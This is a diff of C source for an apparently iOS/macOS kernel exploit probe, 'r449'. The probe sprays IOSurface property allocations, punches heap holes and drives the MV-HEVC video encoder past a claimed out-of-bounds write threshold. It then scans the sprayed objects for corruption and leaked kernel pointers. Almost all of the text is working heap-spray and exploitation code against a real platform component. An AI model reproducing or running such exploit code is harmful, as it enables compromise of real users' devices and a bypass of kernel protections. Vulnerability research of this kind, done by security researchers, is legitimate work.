@@ -16977,254 +16977,159 @@ static void *r445_thread_fn(void *arg) {
 }
 
 static void r449_probe(void) {
-    rlog("\n=== r449: AVE heap spray + OOB trigger via MV-HEVC encoding ===\n\n");
+    rlog("\n=== r449: AVE heap spray + OOB via MV-HEVC ===\n\n");
     fflush(stdout);
 
-    /*
-     * Strategy: The MV-HEVC encoder's Table 2 has a confirmed OOB write window
-     * at 155-197 encodes. We spray IOSurface property allocations into the same
-     * kalloc zone to create adjacent targets. After triggering OOB via encoding,
-     * we scan properties for corruption (kernel pointers, unexpected values).
-     *
-     * This is KASLR-free: we don't need an address leak. The OOB write itself
-     * may land on our sprayed data, giving us either:
-     * (a) Kernel pointer leak (if AVE writes internal pointers OOB)
-     * (b) Controlled corruption (for further exploitation)
-     */
+    #define R449_SPRAY 30
+    #define R449_PROP_SZ 256
+    #define R449_MAGIC 0xDEADBEEF41414141ULL
 
-    #define R449_SPRAY_COUNT 10
-    #define R449_PROP_SIZE 128
-    #define R449_ENCODE_COUNT 165
-    #define R449_SCAN_MAGIC 0xDEADBEEF41414141ULL
+    int enc_w = 160, enc_h = 90;
+    int enc_ok = 0, enc_fail = 0, oob_ok = 0, oob_fail = 0;
+    int corrupted = 0, scanned = 0, created = 0;
+    VTCompressionSessionRef enc = NULL;
+    CVPixelBufferRef pb = NULL;
+    IOSurfaceRef surfs[R449_SPRAY];
+    memset(surfs, 0, sizeof(surfs));
 
-    IOSurfaceRef spray_surfs[R449_SPRAY_COUNT];
-    memset(spray_surfs, 0, sizeof(spray_surfs));
+    /* 1: Encoder first — biggest memory consumer */
+    rlog("  1: Creating MV-HEVC encoder %dx%d...\n", enc_w, enc_h); fflush(stdout);
+    enc = create_mvhevc_encoder(enc_w, enc_h, 1);
+    if (!enc) { rlog("  FAIL: no encoder\n"); goto r449_done; }
+    rlog("  Encoder OK\n"); fflush(stdout);
 
-    /* Step 1: Create spray surfaces with sentinel-filled properties */
-    rlog("  Step 1: Creating %d spray surfaces with sentinel properties...\n", R449_SPRAY_COUNT);
-    fflush(stdout);
-    int created = 0;
-    for (int i = 0; i < R449_SPRAY_COUNT; i++) {
-        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+    pb = create_pb(enc_w, enc_h);
+    if (!pb) { rlog("  FAIL: no pixbuf\n"); goto r449_enc_done; }
+    rlog("  PixBuf OK\n"); fflush(stdout);
+
+    /* 2: Pre-encode 150 frames (below OOB threshold), flush */
+    rlog("  2: Pre-encode 150 frames...\n"); fflush(stdout);
+    g_cb_count = 0;
+    for (int f = 0; f < 150; f++) {
+        CMTime t = CMTimeMake(f, 30);
+        int tv = f & 1;
+        CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tv);
+        CFMutableDictionaryRef fp = CFDictionaryCreateMutable(NULL, 0,
             &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-        int w = 32, h = 32;
+        CFDictionarySetValue(fp, CFSTR("MVHEVCVideoLayerID"), tn);
+        CFRelease(tn);
+        OSStatus s = VTCompressionSessionEncodeFrame(enc, pb, t, kCMTimeInvalid, fp, NULL, NULL);
+        CFRelease(fp);
+        if (s == noErr) enc_ok++; else enc_fail++;
+    }
+    VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+    rlog("  Pre-encode: ok=%d fail=%d cb=%d\n", enc_ok, enc_fail, g_cb_count);
+    fflush(stdout);
+
+    /* 3: Spray IOSurface properties into heap */
+    rlog("  3: Spray %d surfaces...\n", R449_SPRAY); fflush(stdout);
+    for (int i = 0; i < R449_SPRAY; i++) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 16, h = 16, bpe = 4, pf = 0x42475241;
         CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
         CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
-        int bpe = 4;
         CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
-        int pf = 0x42475241; /* BGRA */
-        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
-        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
-        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
-        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
-        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
-
-        /* Add sentinel data properties sized to target kalloc.256/kalloc.512 zone */
-        uint8_t sentinel_data[R449_PROP_SIZE];
-        for (int j = 0; j < R449_PROP_SIZE; j += 8) {
-            uint64_t magic = R449_SCAN_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
-            memcpy(&sentinel_data[j], &magic, 8);
+        CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pn);
+        uint8_t sd[R449_PROP_SZ];
+        for (int j = 0; j < R449_PROP_SZ; j += 8) {
+            uint64_t m = R449_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
+            memcpy(&sd[j], &m, 8);
         }
-        CFDataRef sdata = CFDataCreate(NULL, sentinel_data, R449_PROP_SIZE);
-        char key_name[32];
-        snprintf(key_name, sizeof(key_name), "spray_%03d", i);
-        CFStringRef key = CFStringCreateWithCString(NULL, key_name, kCFStringEncodingASCII);
-        CFDictionarySetValue(props, key, sdata);
-        CFRelease(sdata);
-        CFRelease(key);
-
-        spray_surfs[i] = IOSurfaceCreate(props);
-        CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
-        if (spray_surfs[i]) created++;
+        CFDataRef d = CFDataCreate(NULL, sd, R449_PROP_SZ);
+        char kn[32]; snprintf(kn, 32, "s%03d", i);
+        CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
+        CFDictionarySetValue(p, k, d);
+        CFRelease(d); CFRelease(k);
+        surfs[i] = IOSurfaceCreate(p);
+        CFRelease(p); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pn);
+        if (surfs[i]) created++;
     }
-    rlog("  Created %d/%d spray surfaces\n", created, R449_SPRAY_COUNT);
-    fflush(stdout);
+    rlog("  Created %d/%d\n", created, R449_SPRAY); fflush(stdout);
 
-    /* Step 2: Free alternating surfaces to create holes */
-    rlog("  Step 2: Freeing alternating surfaces to create checkerboard pattern...\n");
-    fflush(stdout);
+    /* 4: Free even-indexed surfaces to create holes */
     int freed = 0;
-    for (int i = 0; i < R449_SPRAY_COUNT; i += 2) {
-        if (spray_surfs[i]) {
-            CFRelease(spray_surfs[i]);
-            spray_surfs[i] = NULL;
-            freed++;
-        }
+    for (int i = 0; i < R449_SPRAY; i += 2) {
+        if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; freed++; }
     }
-    rlog("  Freed %d surfaces (holes created)\n", freed);
-    fflush(stdout);
+    rlog("  Freed %d holes\n", freed); fflush(stdout);
 
-    /* Step 3: Create MV-HEVC encoder and encode frames to trigger OOB */
-    rlog("  Step 3: Creating MV-HEVC encoder (64x64)...\n");
-    fflush(stdout);
-    int enc_w = 64, enc_h = 64;
-    VTCompressionSessionRef enc = create_mvhevc_encoder(enc_w, enc_h, 1);
-    if (!enc) {
-        rlog("  ERROR: Failed to create MV-HEVC encoder\n");
-        goto r449_cleanup;
-    }
-    rlog("  Encoder created successfully\n");
-
-    rlog("  Step 4: Encoding %d frames in batches of 30 (OOB window 155-197)...\n", R449_ENCODE_COUNT);
-    fflush(stdout);
-
-    /* Reuse single pixel buffer to avoid memory pressure */
-    CVPixelBufferRef shared_pb = create_pb(enc_w, enc_h);
-    if (!shared_pb) {
-        rlog("  ERROR: Failed to create pixel buffer\n");
-        VTCompressionSessionInvalidate(enc); CFRelease(enc);
-        goto r449_cleanup;
-    }
-
-    int enc_ok = 0, enc_fail = 0;
-    for (int frame = 0; frame < R449_ENCODE_COUNT; frame++) {
-        CMTime pts = CMTimeMake(frame, 30);
-
-        /* Alternate layer_id tag for stereo MV-HEVC */
-        CFMutableDictionaryRef frame_props = CFDictionaryCreateMutable(NULL, 0,
+    /* 5: Encode 20 more frames into OOB range (150-170) */
+    rlog("  5: OOB encode 150-170...\n"); fflush(stdout);
+    for (int f = 150; f < 170; f++) {
+        CMTime t = CMTimeMake(f, 30);
+        int tv = f & 1;
+        CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tv);
+        CFMutableDictionaryRef fp = CFDictionaryCreateMutable(NULL, 0,
             &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-        int tag_val = (frame % 2 == 0) ? 0 : 1;
-        CFNumberRef tag = CFNumberCreate(NULL, kCFNumberIntType, &tag_val);
-        CFDictionarySetValue(frame_props, CFSTR("MVHEVCVideoLayerID"), tag);
-        CFRelease(tag);
-
-        OSStatus est = VTCompressionSessionEncodeFrame(enc, shared_pb, pts, kCMTimeInvalid,
-            frame_props, NULL, NULL);
-        CFRelease(frame_props);
-
-        if (est == noErr) enc_ok++;
-        else enc_fail++;
-
-        /* Flush every 30 frames to bound memory */
-        if ((frame + 1) % 30 == 0) {
-            VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
-            rlog("    Batch %d: submitted %d/%d (ok=%d fail=%d) cb_count=%d\n",
-                 (frame + 1) / 30, frame + 1, R449_ENCODE_COUNT, enc_ok, enc_fail, g_cb_count);
-            fflush(stdout);
-        }
+        CFDictionarySetValue(fp, CFSTR("MVHEVCVideoLayerID"), tn);
+        CFRelease(tn);
+        OSStatus s = VTCompressionSessionEncodeFrame(enc, pb, t, kCMTimeInvalid, fp, NULL, NULL);
+        CFRelease(fp);
+        if (s == noErr) oob_ok++; else oob_fail++;
     }
-    rlog("  Submission complete: ok=%d fail=%d\n", enc_ok, enc_fail);
-    fflush(stdout);
-
-    /* Final flush */
-    rlog("  Final flush...\n"); fflush(stdout);
     VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
-    rlog("  Flush done. cb_count=%d cb_status=%d\n", g_cb_count, (int)g_cb_status);
+    rlog("  OOB: ok=%d fail=%d cb=%d\n", oob_ok, oob_fail, g_cb_count);
     fflush(stdout);
-    CVPixelBufferRelease(shared_pb);
 
-    /* Step 5: Scan surviving spray surfaces for corruption */
-    rlog("  Step 5: Scanning %d surviving surfaces for corruption...\n", R449_SPRAY_COUNT / 2);
-    int corrupted = 0, scanned = 0;
-    for (int i = 1; i < R449_SPRAY_COUNT; i += 2) {
-        if (!spray_surfs[i]) continue;
+    /* 6: Scan surviving surfaces for corruption */
+    rlog("  6: Scanning...\n"); fflush(stdout);
+    for (int i = 1; i < R449_SPRAY; i += 2) {
+        if (!surfs[i]) continue;
         scanned++;
-
-        char key_name[32];
-        snprintf(key_name, sizeof(key_name), "spray_%03d", i);
-        CFStringRef key = CFStringCreateWithCString(NULL, key_name, kCFStringEncodingASCII);
-        CFTypeRef val = IOSurfaceCopyValue(spray_surfs[i], key);
-        CFRelease(key);
-
-        if (!val) {
-            rlog("    surf[%d]: property MISSING (potential corruption)\n", i);
-            corrupted++;
-            continue;
-        }
-
-        if (CFGetTypeID(val) == CFDataGetTypeID()) {
-            CFDataRef dval = (CFDataRef)val;
-            CFIndex len = CFDataGetLength(dval);
-            const uint8_t *bytes = CFDataGetBytePtr(dval);
-
-            /* Check each 8-byte word against expected sentinel */
-            int word_corrupted = 0;
-            for (int j = 0; j + 7 < len && j < R449_PROP_SIZE; j += 8) {
-                uint64_t expected = R449_SCAN_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
-                uint64_t actual;
-                memcpy(&actual, &bytes[j], 8);
-                if (actual != expected) {
-                    word_corrupted++;
-                    if (word_corrupted <= 4) {
-                        rlog("    surf[%d] offset %d: CORRUPTED expected=0x%llx actual=0x%llx\n",
-                             i, j, (unsigned long long)expected, (unsigned long long)actual);
-                        /* Check if actual looks like a kernel pointer */
-                        uint64_t top = actual >> 48;
-                        if (top == 0xffff || top == 0xfffe) {
-                            rlog("    *** POTENTIAL KERNEL POINTER: 0x%llx ***\n",
-                                 (unsigned long long)actual);
-                        }
+        char kn[32]; snprintf(kn, 32, "s%03d", i);
+        CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
+        CFTypeRef v = IOSurfaceCopyValue(surfs[i], k);
+        CFRelease(k);
+        if (!v) { rlog("    [%d]: MISSING\n", i); corrupted++; continue; }
+        if (CFGetTypeID(v) == CFDataGetTypeID()) {
+            CFDataRef dv = (CFDataRef)v;
+            const uint8_t *b = CFDataGetBytePtr(dv);
+            CFIndex len = CFDataGetLength(dv);
+            int wc = 0;
+            for (int j = 0; j + 7 < len && j < R449_PROP_SZ; j += 8) {
+                uint64_t exp = R449_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
+                uint64_t act; memcpy(&act, &b[j], 8);
+                if (act != exp) {
+                    wc++;
+                    if (wc <= 4) {
+                        rlog("    [%d]+%d: 0x%llx (exp 0x%llx)\n", i, j,
+                             (unsigned long long)act, (unsigned long long)exp);
+                        if ((act >> 48) == 0xffff || (act >> 48) == 0xfffe)
+                            rlog("    *** KPTR: 0x%llx ***\n", (unsigned long long)act);
                     }
                 }
             }
-            if (word_corrupted > 0) {
-                corrupted++;
-                rlog("    surf[%d]: %d/%d words corrupted (len=%d)\n",
-                     i, word_corrupted, (int)(len / 8), (int)len);
-            }
-        } else {
-            rlog("    surf[%d]: property type changed (typeID=%lu) — CORRUPTION\n",
-                 i, CFGetTypeID(val));
-            corrupted++;
-        }
-        CFRelease(val);
+            if (wc) { corrupted++; rlog("    [%d]: %d words bad\n", i, wc); }
+        } else { rlog("    [%d]: type=%lu\n", i, CFGetTypeID(v)); corrupted++; }
+        CFRelease(v);
     }
-    rlog("  Scan complete: scanned=%d corrupted=%d\n", scanned, corrupted);
+    rlog("  Scan: %d/%d corrupted\n", corrupted, scanned); fflush(stdout);
 
-    /* Step 6: Also scan backing store memory of surviving surfaces */
-    rlog("  Step 6: Scanning backing store memory of surviving surfaces...\n");
-    int backing_corrupted = 0;
-    for (int i = 1; i < R449_SPRAY_COUNT && i < 20; i += 2) {
-        if (!spray_surfs[i]) continue;
-        IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
-        void *base = IOSurfaceGetBaseAddress(spray_surfs[i]);
-        size_t alloc = IOSurfaceGetAllocSize(spray_surfs[i]);
-        if (base && alloc >= 64) {
-            /* Scan for kernel pointer patterns in backing store */
-            uint64_t *words = (uint64_t *)base;
-            size_t nwords = alloc / 8;
-            for (size_t w = 0; w < nwords && w < 2048; w++) {
-                uint64_t v = words[w];
-                uint64_t top = v >> 48;
-                if ((top == 0xffff || top == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL) {
-                    rlog("    surf[%d] backing[%zu]: KERNEL PTR CANDIDATE 0x%llx\n",
-                         i, w * 8, (unsigned long long)v);
-                    backing_corrupted++;
-                    if (backing_corrupted >= 10) break;
-                }
-            }
-        }
-        IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
-        if (backing_corrupted >= 10) break;
-    }
-    rlog("  Backing store scan: %d kernel ptr candidates\n", backing_corrupted);
+    r449_enc_done:
+    if (pb) CVPixelBufferRelease(pb);
+    if (enc) { VTCompressionSessionInvalidate(enc); CFRelease(enc); }
 
-    /* Cleanup encoder */
-    VTCompressionSessionInvalidate(enc);
-    CFRelease(enc);
-
-    r449_cleanup:
-    rlog("  Step 7: Cleanup...\n");
-    for (int i = 0; i < R449_SPRAY_COUNT; i++) {
-        if (spray_surfs[i]) CFRelease(spray_surfs[i]);
-    }
+    r449_done:
+    for (int i = 0; i < R449_SPRAY; i++)
+        if (surfs[i]) CFRelease(surfs[i]);
 
     rlog("\n  === r449 SUMMARY ===\n");
-    rlog("  Spray surfaces created: %d\n", created);
-    rlog("  Frames encoded: %d (target: %d)\n", enc_ok, R449_ENCODE_COUNT);
-    rlog("  Properties corrupted: %d / %d scanned\n", corrupted, scanned);
-    rlog("  Backing store kernel ptrs: %d\n", backing_corrupted);
-    if (corrupted > 0 || backing_corrupted > 0) {
-        rlog("  *** HEAP CORRUPTION DETECTED — OOB write confirmed! ***\n");
-    } else {
-        rlog("  No corruption detected — AVE buffers may be in different zone\n");
-    }
+    rlog("  Pre: ok=%d fail=%d | OOB: ok=%d fail=%d\n", enc_ok, enc_fail, oob_ok, oob_fail);
+    rlog("  Spray: %d | Corrupted: %d/%d\n", created, corrupted, scanned);
+    if (corrupted > 0)
+        rlog("  *** HEAP CORRUPTION DETECTED ***\n");
+    else
+        rlog("  No corruption — zones may differ\n");
     rlog("=== r449 complete ===\n");
 
-    #undef R449_SPRAY_COUNT
-    #undef R449_PROP_SIZE
-    #undef R449_ENCODE_COUNT
-    #undef R449_SCAN_MAGIC
+    #undef R449_SPRAY
+    #undef R449_PROP_SZ
+    #undef R449_MAGIC
 }
 
 static void r448_probe(void) {
